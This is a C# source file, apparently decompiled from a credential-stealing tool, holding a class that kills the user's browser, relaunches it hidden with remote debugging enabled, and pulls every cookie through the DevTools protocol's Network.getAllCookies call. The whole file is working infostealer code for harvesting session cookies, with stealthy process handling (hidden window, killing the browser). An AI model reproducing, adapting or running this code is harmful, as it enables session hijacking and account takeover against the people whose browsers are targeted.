using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net.Http;
using System.Net.WebSockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace SHARP
{
    internal class V20Collect
    {
      private const int DEBUG_PORT = 9222;
      private static readonly string DEBUG_URL = $"http://localhost:{9222}/json";
      private static readonly string LOCAL_APP_DATA = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);

      public static async Task<CookieFormat[]> GetCookiesFromBrowser(KeyValuePair<string, string> path)
      {
        try
        {
          string binPath = "";
          Dictionary<string, string> dictionary = PathsCV20.PATHS[path.Key];
          string path1 = dictionary["bin1"];
          string path2 = dictionary["bin2"];
          string path3 = dictionary["bin3"];
          if (File.Exists(path1))
            binPath = path1;
          if (File.Exists(path2))
            binPath = path2;
          if (File.Exists(path3))
            binPath = path3;
          if (binPath == "")
            return (CookieFormat[]) null;
          string str = path.Value;
          string command = $"{PathsCV20.commandT}\"{str}\"";
          V20Collect.CloseBrowser(binPath);
          V20Collect.StartBrowser(binPath, command);
          CookieFormat[] cookies = await V20Collect.GetCookies(await V20Collect.GetDebugWsUrl());
          V20Collect.CloseBrowser(binPath);
          return cookies;
        }
        catch (Exception ex)
        {
          return (CookieFormat[]) null;
        }
      }

      private static string ParseDebugWsUrl(string content)
      {
        string str1 = content;
        char[] chArray = new char[1]{ '\n' };
        foreach (string str2 in str1.Split(chArray))
        {
          if (str2.Contains("webSocketDebuggerUrl"))
            return str2.Replace("webSocketDebuggerUrl", " ").Replace('"', ' ').Trim().Substring(1).Trim();
        }
        return (string) null;
      }

      private static async Task<string> GetDebugWsUrl()
      {
        string debugWsUrl;
        using (HttpClient client = new HttpClient())
        {
          HttpResponseMessage async = await client.GetAsync(V20Collect.DEBUG_URL);
          async.EnsureSuccessStatusCode();
          string content = await async.Content.ReadAsStringAsync();
          try
          {
            debugWsUrl = V20Collect.ParseDebugWsUrl(content);
            goto label_10;
          }
          catch
          {
          }
          throw new Exception("Could not find 'webSocketDebuggerUrl' in the debug info.");
        }
    label_10:
        return debugWsUrl;
      }

      private static void CloseBrowser(string binPath)
      {
        string fileName = Path.GetFileName(binPath);
        try
        {
          foreach (Process process in Process.GetProcessesByName(Path.GetFileNameWithoutExtension(fileName)))
            process.Kill();
        }
        catch
        {
        }
      }

      private static void StartBrowser(string binPath, string command)
      {
        Process.Start(new ProcessStartInfo()
        {
          FileName = binPath,
          Arguments = command,
          RedirectStandardOutput = true,
          RedirectStandardError = true,
          UseShellExecute = false,
          CreateNoWindow = true,
          WindowStyle = ProcessWindowStyle.Hidden
        });
      }

      private static async Task<CookieFormat[]> GetCookies(string wsUrl)
      {
        List<CookieFormat> cookies = new List<CookieFormat>();
        CookieFormat[] array;
        using (ClientWebSocket ws = new ClientWebSocket())
        {
          TaskCompletionSource<object> tcs = new TaskCompletionSource<object>();
          try
          {
            await ws.ConnectAsync(new Uri(wsUrl), CancellationToken.None);
            await V20Collect.SendMessageAsync(ws, "{\"id\": 1, \"method\": \"Network.getAllCookies\"}");
            cookies = V20Collect.ParseCookiesFromResponse(await V20Collect.ReceiveMessageAsync(ws));
            tcs.SetResult((object) null);
          }
          catch (Exception ex)
          {
            tcs.SetException(ex);
          }
          finally
          {
            if (ws.State == WebSocketState.Open)
              await ws.CloseAsync(WebSocketCloseStatus.NormalClosure, "Closing", CancellationToken.None);
          }
          object task = await tcs.Task;
          array = cookies.ToArray();
        }
        cookies = (List<CookieFormat>) null;
        return array;
      }

      private static string writteCookieToFile(string response)
      {
        string contents = response.Replace(',', '\n');
        string path = V20Collect.LOCAL_APP_DATA + BRWSR.GenerateRandomString(20);
        File.WriteAllText(path, contents);
        return path;
      }

      private static string parseValue(string value)
      {
        string empty = string.Empty;
        return ((IEnumerable<string>) value.Split(':')).Last<string>().Replace('"', ' ').Trim();
      }

      private static List<CookieFormat> ParseCookiesFromResponse(string response)
      {
        List<CookieFormat> cookiesFromResponse = new List<CookieFormat>();
        try
        {
          string file = V20Collect.writteCookieToFile(response);
          string[] strArray = File.ReadAllLines(file);
          string empty1 = string.Empty;
          string empty2 = string.Empty;
          string empty3 = string.Empty;
          string empty4 = string.Empty;
          string empty5 = string.Empty;
          foreach (string str in strArray)
          {
            if (empty5 != string.Empty)
            {
              ++Counting.Cookies;
              cookiesFromResponse.Add(new CookieFormat(empty3, empty1, empty4, empty2, empty5));
              empty1 = string.Empty;
              empty2 = string.Empty;
              empty3 = string.Empty;
              empty4 = string.Empty;
              empty5 = string.Empty;
            }
            if (str.Contains("name"))
              empty1 = V20Collect.parseValue(str);
            if (str.Contains("value"))
              empty2 = V20Collect.parseValue(str);
            if (str.Contains("domain"))
              empty3 = V20Collect.parseValue(str);
            if (str.Contains("path"))
              empty4 = V20Collect.parseValue(str);
            if (str.Contains("expires"))
              empty5 = V20Collect.parseValue(str);
          }
          File.Delete(file);
          return cookiesFromResponse;
        }
        catch
        {
        }
        return (List<CookieFormat>) null;
      }

      private static async Task SendMessageAsync(ClientWebSocket socket, string message)
      {
        await socket.SendAsync(new ArraySegment<byte>(Encoding.UTF8.GetBytes(message)), WebSocketMessageType.Text, true, CancellationToken.None);
      }

      private static async Task<string> ReceiveMessageAsync(ClientWebSocket socket)
      {
        byte[] buffer = new byte[4096 /*0x1000*/];
        StringBuilder stringBuilder = new StringBuilder();
        WebSocketReceiveResult async;
        do
        {
          async = await socket.ReceiveAsync(new ArraySegment<byte>(buffer), CancellationToken.None);
          stringBuilder.Append(Encoding.UTF8.GetString(buffer, 0, async.Count));
        }
        while (!async.EndOfMessage);
        string messageAsync = stringBuilder.ToString();
        buffer = (byte[]) null;
        stringBuilder = (StringBuilder) null;
        return messageAsync;
      }
    }
}
